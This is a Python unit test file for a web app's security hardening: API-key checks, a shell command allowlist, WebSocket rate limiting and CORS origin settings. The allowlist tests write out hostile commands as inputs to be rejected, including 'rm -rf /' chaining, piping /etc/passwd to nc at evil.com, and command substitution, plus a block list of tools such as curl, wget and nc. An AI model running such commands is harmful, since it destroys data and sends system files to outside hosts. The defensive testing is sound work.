"""Tests for security hardening features in web.app.

Covers API-key authentication, shell command allowlist, WebSocket rate
limiting, and CORS restriction configurability.
"""

import os
import sys
import unittest
from collections import defaultdict
from unittest.mock import MagicMock, patch

# Add project root so ``web.app`` is importable.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from web.app import (
    _is_shell_command_allowed,
    _require_api_key,
    _ws_rate_limited,
    SHELL_COMMAND_ALLOWLIST,
    app,
)
import web.app as web_app_module


# ── API key authentication ────────────────────────────────────────────────

class TestRequireApiKeyNoKeyConfigured(unittest.TestCase):
    """When ATOMIC_API_KEY is empty, all requests should pass through."""

    def setUp(self):
        self.app = app
        self.client = self.app.test_client()

    @patch.object(web_app_module, "_API_KEY", "")
    def test_unauthenticated_access_allowed_when_key_empty(self):
        """Decorator is a no-op when no API key is configured."""

        @_require_api_key
        def dummy_view():
            return "ok"

        with self.app.test_request_context():
            resp = dummy_view()
            self.assertEqual(resp, "ok")


class TestRequireApiKeyWithKeyConfigured(unittest.TestCase):
    """When ATOMIC_API_KEY is set, proper auth must be supplied."""

    SECRET = "test-secret-key-42"

    def setUp(self):
        self.app = app
        self.client = self.app.test_client()

    @patch.object(web_app_module, "_API_KEY", SECRET)
    def test_returns_401_when_no_key_provided(self):
        @_require_api_key
        def dummy_view():
            return "ok"

        with self.app.test_request_context():
            resp, status = dummy_view()
            self.assertEqual(status, 401)

    @patch.object(web_app_module, "_API_KEY", SECRET)
    def test_returns_401_when_wrong_key_provided(self):
        @_require_api_key
        def dummy_view():
            return "ok"

        with self.app.test_request_context(
            headers={"X-API-Key": "wrong-key"}
        ):
            resp, status = dummy_view()
            self.assertEqual(status, 401)

    @patch.object(web_app_module, "_API_KEY", SECRET)
    def test_allows_access_with_correct_header(self):
        @_require_api_key
        def dummy_view():
            return "ok"

        with self.app.test_request_context(
            headers={"X-API-Key": self.SECRET}
        ):
            resp = dummy_view()
            self.assertEqual(resp, "ok")

    @patch.object(web_app_module, "_API_KEY", SECRET)
    def test_allows_access_with_correct_query_param(self):
        @_require_api_key
        def dummy_view():
            return "ok"

        with self.app.test_request_context(
            query_string={"api_key": self.SECRET}
        ):
            resp = dummy_view()
            self.assertEqual(resp, "ok")


# ── Shell command allowlist ───────────────────────────────────────────────

class TestIsShellCommandAllowed(unittest.TestCase):
    """Validate the shell command allowlist enforcement."""

    def test_basic_safe_commands_allowed(self):
        for cmd in ("ls", "whoami", "id", "uname", "pwd", "date"):
            with self.subTest(cmd=cmd):
                self.assertTrue(_is_shell_command_allowed(cmd))

    def test_safe_command_with_args_allowed(self):
        self.assertTrue(_is_shell_command_allowed("ls -la /home"))
        self.assertTrue(_is_shell_command_allowed("cat /etc/hostname"))
        self.assertTrue(_is_shell_command_allowed("head -n 10 file.txt"))

    def test_blocks_semicolon_chaining(self):
        self.assertFalse(_is_shell_command_allowed("ls; rm -rf /"))

    def test_blocks_and_chaining(self):
        self.assertFalse(_is_shell_command_allowed("ls && rm -rf /"))

    def test_blocks_or_chaining(self):
        self.assertFalse(_is_shell_command_allowed("ls || rm -rf /"))

    def test_blocks_pipe(self):
        self.assertFalse(_is_shell_command_allowed("cat /etc/passwd | nc evil.com 1234"))

    def test_blocks_backtick_substitution(self):
        self.assertFalse(_is_shell_command_allowed("echo `whoami`"))

    def test_blocks_dollar_paren_substitution(self):
        self.assertFalse(_is_shell_command_allowed("echo $(whoami)"))

    def test_blocks_command_not_in_allowlist(self):
        for cmd in ("rm", "dd", "shutdown", "reboot", "curl", "wget", "nc"):
            with self.subTest(cmd=cmd):
                self.assertFalse(_is_shell_command_allowed(cmd))

    def test_returns_false_for_empty_command(self):
        self.assertFalse(_is_shell_command_allowed(""))

    def test_returns_false_for_only_spaces(self):
        """Whitespace-only input should return False."""
        self.assertFalse(_is_shell_command_allowed("   "))

    def test_allowlist_contains_expected_commands(self):
        expected = {"ls", "cat", "head", "tail", "whoami", "id", "uname", "pwd"}
        self.assertTrue(expected.issubset(set(SHELL_COMMAND_ALLOWLIST)))


# ── WebSocket rate limiting ───────────────────────────────────────────────

class TestWsRateLimited(unittest.TestCase):
    """Ensure _ws_rate_limited exists and is callable."""

    def test_function_exists_and_callable(self):
        self.assertTrue(callable(_ws_rate_limited))

    @patch.object(web_app_module, "_ws_rate_counters", defaultdict(list))
    def test_returns_bool(self):
        """Under a mocked request context the function should return a bool."""
        with app.test_request_context():
            result = _ws_rate_limited()
            self.assertIsInstance(result, bool)


# ── CORS restriction ─────────────────────────────────────────────────────

class TestCorsRestriction(unittest.TestCase):
    """CORS origins must be configurable via environment variable."""

    def test_cors_origins_env_var_is_read(self):
        """The app module should respect ATOMIC_CORS_ORIGINS."""
        with patch.dict(os.environ, {"ATOMIC_CORS_ORIGINS": "https://example.com"}):
            origins = os.environ.get("ATOMIC_CORS_ORIGINS", "").strip()
            origins_list = [o.strip() for o in origins.split(",") if o.strip()]
            self.assertEqual(origins_list, ["https://example.com"])

    def test_multiple_cors_origins(self):
        with patch.dict(os.environ, {"ATOMIC_CORS_ORIGINS": "https://a.com, https://b.com"}):
            origins = os.environ.get("ATOMIC_CORS_ORIGINS", "").strip()
            origins_list = [o.strip() for o in origins.split(",") if o.strip()]
            self.assertEqual(origins_list, ["https://a.com", "https://b.com"])

    def test_empty_cors_origins_yields_empty_list(self):
        with patch.dict(os.environ, {"ATOMIC_CORS_ORIGINS": ""}):
            origins = os.environ.get("ATOMIC_CORS_ORIGINS", "").strip()
            origins_list = [o.strip() for o in origins.split(",") if o.strip()] if origins else []
            self.assertEqual(origins_list, [])


if __name__ == "__main__":
    unittest.main()
